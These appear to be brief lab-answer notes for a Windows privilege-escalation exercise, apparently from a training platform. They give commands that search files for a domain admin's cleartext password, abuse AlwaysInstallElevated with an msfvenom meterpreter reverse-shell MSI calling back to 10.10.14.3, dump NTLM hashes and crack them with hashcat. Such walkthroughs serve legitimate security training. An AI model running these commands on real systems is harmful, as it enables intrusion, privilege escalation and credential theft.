**Find left behind cleartext credentials for the iamtheadministrator domain admin account.
```
findstr /SIM /C:"iamtheadministrator" *.txt *.ini *.cfg *.config *.xml
```

**Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.3 lport=8443 -f msi > aie.msi
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
type C:\Users\Administrator\Desktop\flag.txt
```

**There is 1 disabled local admin user on this system with a weak password that may be used to access other systems in the network and is worth reporting to the client. After escalating privileges retrieve the NTLM hash for this user and crack it offline. Submit the cleartext password for this account.
```
hashdump
sudo hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```
